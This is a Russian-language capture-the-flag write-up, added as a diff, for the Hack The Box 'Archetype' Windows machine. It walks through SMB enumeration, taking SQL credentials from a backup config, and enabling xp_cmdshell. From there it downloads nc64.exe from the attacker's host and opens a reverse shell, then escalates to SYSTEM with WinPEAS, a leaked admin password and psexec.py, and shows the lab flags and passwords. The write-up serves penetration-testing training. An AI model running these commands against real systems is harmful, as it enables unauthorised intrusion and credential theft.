@@ -1,0 +1,460 @@
+*** ARCHETYPE 
+
+	
+	### Introduction 
+		
+		- Добро пожаловать на УРОВЕНЬ II! Молодцы, что прошли этот момент. 
+		С этого момента ящики становятся более сложными в использовании шагов, 
+		использования инструментов и использования, поскольку они начинают 
+		выглядеть как ящики на основной платформе HTB. начиная с Archetype, 
+		который является машиной Windows, у вас есть возможность использовать 
+		неправильную настройку в Microsoft SQL Server, попробовать получить 
+		редкую оболочку и ознакомиться с использованием IMPACKET (УДАР) 
+		инструмент для дальнейшего распространения на некоторые сервисы.
+
+	
+	### Enumeration
+		
+		@ nmap -sC -sV {target_ip}
+
+			135/tcp  open  msrpc        Microsoft Windows RPC
+			139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+			445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
+			1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
+
+		- Мы обнаружили, что порты SMB открыты: 
+			# 139, 445
+
+		- А также что Microsoft SQL Server 2017 работает на порту 1433. 
+		Мы собираемся перечислить SMB с помощью инструмента: 
+			
+				smbclient
+				-N # No password 
+				-L # look at what services are available on a server
+			
+			@ smbclient -N -L \\\\{target_ip}\\ 
+				
+				ADMIN$          Disk      Remote Admin
+				backups         Disk
+				C$              Disk      Default share
+				IPC$            IPC       Remote IPC
+
+				SMB1 disabled -- no workgroup available 
+
+				
+		- Мы нашли пару интересных папок: ADMIN$ and C$
+			
+			@ smbclient -N \\\\{target_ip}\\ADMIN$
+			@ smbclient -N \\\\{target_ip}\\C$
+				
+				tree connect failed: NT_STATUS_ACCESS_DENIED
+
+		- Доступ запрещен, однако мы можем попытаться получить доступ к BACKUPS
+			
+			@ smbclient -N \\\\{target_ip}\\backups
+				
+			@ dir 
+
+				.
+				..
+				prod.dtsConfig 
+
+			@ get prod.dtsConfig # download file from the SMB server
+
+			@ exit 
+
+		- После скачиванифя файла можно посмотреть его содержимое в попытке
+		найти данные авторизации 
+			
+			cat prod.dtsConfig | grep -iE password 
+				
+				<ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
+
+			- User ID:	ARCHETYPE\sql_svc
+			- Password:	M3g4c0rp123
+			
+		- Посмотрев соедржимое файла конфигурации, мы обнаружили учетные данные
+		С представленными учетными данными нам просто нужен способ подключиться
+		и аутентифицироваться на сервере MSSQL
+
+
+	
+	### IMPACKET (УДАР) 1443/tcp port Microsoft Sql Server
+		
+		- Impacket инструмент включает ценный скрипт Python под названием:
+			
+			mssqlclient.py
+
+		- Impacket — это набор классов Python для работы с сетевыми протоколами. 
+		Impacket ориентирован на обеспечение низкоуровневого программного 
+		доступа к пакетам и для некоторых протоколов (например, SMB1-3 и MSRPC) 
+		на реализацию самого протокола. Пакеты можно создавать с нуля, а также 
+		анализировать из необработанных данных, а объектно-ориентированный API 
+		упрощает работу с глубокими иерархиями протоколов. Библиотека 
+		предоставляет набор инструментов в качестве примеров того, что можно 
+		сделать в контексте этой библиотеки.
+		
+		- Download impacket:
+			
+			git clone https://github.com/SecureAuthCorp/impacket
+
+		- Installation impacket
+			
+			@ sudo pacman -S python python-pip
+
+			~impacketgit@: pip install 
+			
+			#OR:
+			
+			~impacketgit@: sudo python3 setup.py install 
+
+			# Если пропущены некоторые модули 
+
+			~impacketgit@: pip install -r requirements.txt 
+
+		- Using impacket
+
+			~impacketgit@: python build/scripts-3.10/mssqlclient.py -h
+				
+				# показать основные команды
+
+	### Connect to MSSQL Server
+
+		-Разобравшись с представленными параметрами, мы можем попытаться
+		подключиться к серверу MSSQL, выполнив следующую команду:
+
+		~impacketgit@: # impacket's directory 
+
+		python3 build/scripts-3.10/mssqlclient.py ARCHETYPE/sql_svc@{target_ip} -windows-auth 
+
+			Impacket v0.10.1.dev1+20220513.140233.fb1e50c1 - Copyright 2022 SecureAuth Corporation
+			@Password: input "M3g4c0rp123"
+			[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
+		
+	### MSSQLCLIENT.PY Microsoft SQL Server:
+
+		- Мы успешно прошли аутентификацию на Miscrosoft SQL Server
+
+			SQL> help # check the options
+			
+			- Параметр справки описывает самые основные функции, которые он 
+			предлагает, а это означает, что нам необходимо провести дальнейшее 
+			исследование, чтобы понять внутреннюю работу каждой функции. 
+			
+			- Вот две замечательные статьи, которые помогут нам продолжить 
+			изучение MSSQL Server:
+				
+				https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
+
+				https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
+
+
+		--- FIRST STEP В качестве первого шага нам нужно проверить, какая у нас 
+		роль на сервере. Мы будем использовать команду из приведенной выше 
+		шпаргалки:
+
+			SQL> SELECT is_srvrolemember('sysadmin');
+				
+				-------------
+							1
+		--- TWO STEP  предыдущих шпаргалках мы также нашли, как настроить 
+		выполнение команды через xp_cmdshell
+	
+			SQL> EXEC xp_cmdshell 'net user';
+				
+				[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to 
+				procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because 
+				this component is turned off 
+			
+
+		--- THIRD STEP Понадобиться повторно активировать xp_cmdshell, так как
+		изначально он отключен
+			
+			SQL> EXEC sp_configure 'xp_cmdshell', 1;
+				
+				[-] ERROR(ARCHETYPE): Line 62: The configuration option 
+				'xp_cmdshell' does not exist, or it may be an advanced option.
+				
+				# По умолчанию видимость осталных опций отключено 
+
+			- Включаем опцию видимости имен остальных опций
+
+			SQL> EXEC sp_configure 'show advanced options', 1;
+				
+				[*] INFO(ARCHETYPE): Line 185: Configuration option 
+				'show advanced options' changed from 0 to 1. Run the 
+				RECONFIGURE statement to install.
+
+			SQL> RECONFIGURE; 
+				
+				# реконфигурируем изменения
+
+			SQL> sp_configure;
+				
+				# отобразить список остальных разблокированных опций
+
+		--- FOURTH STEP Активируем xp_cmdshell при помощи sp_configure
+		
+			-  XP_cmdshell — очень мощная расширенная процедура, используемая для 
+			запуска командной строки (cmd)  
+			
+			SQL> EXEC sp_configure 'xp_cmdshell', 1; 
+				
+				[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.			
+
+			SQL> RECONFIGURE;
+
+			
+			- Проверяем работу xp_cmdshell 'net user'
+				
+			SQL> EXEC xp_cmdshell 'net user';	
+
+				User accounts for \\ARCHETYPE
+				-----------------------------
+				sql_svc                  WDAGUtilityAccount
+
+				The command completed successfully. # Успешно выполнено
+
+		--- LAST STEP
+		Теперь мы можем выполнять системные команды 
+			
+			SQL> xp_cmdshell 'whoami';
+				
+				archetype\sql_svc
+
+	
+			Наконец-то удалось добиться выполнения команды!!!!!!
+
+		
+	### TRY GET A STABLE REVERSE SHELL
+	Пробуем получить стабильную обратную оболочку
+		
+		- Загрузим nc64.exe двоичный файл к цели машины:
+			
+			https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------
+		
+		И выполним интерактивный cmd.exe на нашем порту прослушивания 
+
+		- Мы переходим в папку и затем запускаем простой HTTP-сервер, затем 
+		прослушиватель netcat на другой вкладке с помощью следующих команд:
+
+			@ sudo python -m http.server 80
+				
+				# запустить простой web server, для доступа к серверу можно
+				использовать такой url:
+					
+					http://localhost/ 
+
+			@ sudo nc -lvnp 443
+				
+				# прослушивать входящие соединения на 443 порту  
+
+		- Чтобы загрузить двоичный файл в целевую систему, нам нужно найти 
+		для этого подходящую папку. Мы будем использовать PowerShell: 
+			
+			-c # флаг указывает powershell выполнить команду 
+			
+			SQL> xp_cmdshell "powershell -c pwd" # отобразить текущий каталог 
+				
+				C:\Windows\system32 
+
+		- Как пользователь archetype\sql_svc, у нас недостаточно прав для 
+		загрузки файлов в системный каталог. И только Administrator может
+		выполнять действия с более высокими привилегиями. Нам нужно изменить
+		рабочий текущий каталог где-нибудь в домашнем каталоге нашего
+		пользователя, куда можно будет писать 
+			
+			SQL>	xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; 
+					wget http://10.10.15.155/nc64.exe -outfile nc64.exe"
+			
+				NULL 
+
+		- Мы можем проверить на нашем простом HTTP-сервере Python, что целевая
+		машина действительно выполнила запрос:
+
+			@ sudo python http.server 80
+			Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+			10.129.179.115 - - [23/May/2022 16:37:59] "GET /nc64.exe HTTP/1.1" 200	
+		
+			
+		- Теперь мы можем связать cmd.exe сквозь nc к нашему слушателю 
+
+			SQL>	xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; 
+					.\nc64.exe -e cmd.exe 10.10.15.155 443"	
+
+				... 
+
+		- Наконец, оглядываясь назад на наш прослушиватель netcat, мы можем 
+		подтвердить нашу обратную оболочку и нашу точку опоры в системе:
+			
+			@ sudo nc -lvnp 443
+		 	Connection from 10.129.179.115:49679
+			Microsoft Windows [Version 10.0.17763.2061]
+			(c) 2018 Microsoft Corporation. All rights reserved.
+
+			C:\Users\sql_svc\Downloads> 
+
+		- Файл пользователя можно найти на рабочем столе
+			
+			cd C:\Users\sql_svc\Desktop
+				
+				C:\Users\sql_svc\Desktop
+
+			C:\Users\sql_svc\Downloads> dir
+				
+				32 user.txt
+				  32 bytes
+
+			C:\Users\sql_svc\Downloads> type user.txt 
+				
+				3e7b102e78218e935bf3f4951fec21au3 | user flag was found 
+
+	
+	### Privilege Escalation
+	Повышение привилегий 
+		
+		- Для повышения привилегий мы собираемся использовать инструмент под 
+		названием WinPEAS, который может автоматизировать больщую часть 
+		процессов перечисления в целевой системе. 
+
+		- Дополнительную информацию о перечислении систем Windows для путей 
+		повышения привилегий  можно найти в модуле академии HTB:
+
+			https://academy.hackthebox.com/course/preview/windows-privilege-escalation
+
+							     
+		- WinPEAS можно скачать здесь:
+			
+			https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe
+
+		- Перенесем его в нашу целевую систему, снова используя http.server на
+		python:
+		
+			### MY MACHINE  10.10.15.155
+
+			cd Project/files/
+			ls 
+				winPEASx64.exe 
+
+			sudo python -m http.server 80 
+				
+				Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 
+
+			### TARGET HOST 10.129.179.115 
+
+			C:\Users\sql_svc\Desktop> cd ..\Downloads
+				
+				# Переходим в папку загрузки 
+
+			C:\Users\sql_svc\Downloads> powershell
+				
+				### Запускаем PowerShell TARGET HOST
+
+				PS  C:\Users\sql_svc\Downloads> 
+
+				wget http://10.10.15.155/winPEASx64.exe -outfile winPEASx64.exe
+
+				PS  C:\Users\sql_svc\Downloads> 
+
+				### MY MACHINE 
+					
+					python -m http.server 80
+					Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 
+					10.129.179.115 - - [23/May/2022 17:19:08] "GET /winPEASx64.exe HTTP/1.1" 200 -
+
+		-  Мы успешно скачали бинарник:
+			
+			### TARGET HOST 
+				
+			PS C:\Users\sql_svc\Downloads> ls
+					
+				nc64.exe
+				winPEASx64.exe 
+
+		- Для его выполнения сделаем следующее 
+
+			PS C:\Users\sql_svc\Downloads> .\winPEASx64.exe 
+			 	
+				...	(ПРИМЕЧАНИЕ) вывод очень длинный 
+				
+				Current Token privileges
+				SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+					
+					# очень опасная уязвимость привилегий, более подробную
+					информацию читать здесь:
+
+						https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege
+
+					# эта привилегия также уязвима для JUICY POTATO EXPLOIT
+						
+						https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato
+
+
+				Analyzing Windows Files Files (limit 70)
+				C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt	
+					
+					# Важная находка, Поскольку это обычная учетная запись 
+					пользователя, а также учетная запись службы, стоит проверить 
+					часто используемые файлы или выполняемые команды. Для этого 
+					мы прочитаем файл истории PowerShell, который эквивалентен: 
+						
+						.bash_history # Для Linux систем
+						
+						ConsoleHost_history.txt # Для PowerShell Windows 
+					
+					# Файл можно найти в каталоге
+						
+						C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\
+		
+		- Перейдем к папке где хранится история PowerShell:
+
+			PS C:\Users\sql_svc> cd AppData 
+
+			PS C:\Users\sql_svc\AppData>
+				
+				cd Roaming\Microsoft\Windows\PowerShell\PSReadline\
+
+			PS C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline> 
+				
+				dir
+					79 ConsoleHost_history.txt
+
+				type ConsoleHost_history.txt 
+					
+					net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+					exit
+				
+		- Мы получили в открытом виде пароль для пользователя administrator:
+			
+			MEGACORP_4dm1n!! 
+
+		
+		- Теперь мы можем использовать psexec.py снова из набора Impacket, чтобы
+		получить оболочку от имени администратора 
+			
+			### My MACHINE DIRECTORY IMPACKET
+
+				python3 psexec.py administrator@{TARGET_IP}
+
+				[*] Requesting shares on 10.129.179.115.....
+				[*] Starting service akVq..... 
+				
+			### TARGET MACHINE
+
+				C:\Windows\system32> whoami
+					
+					nt authority\system
+
+				C:\Windows\system32> cd C:\Users\Administrator\Desktop
+				
+				C:\Users\Administrator\Desktop> dir 
+					
+					32 root.txt
+
+				C:\Users\Administrator\Desktop> type root.txt 
+					
+					b91ccec3305e98240082d4474b848528
+
+
+				
+
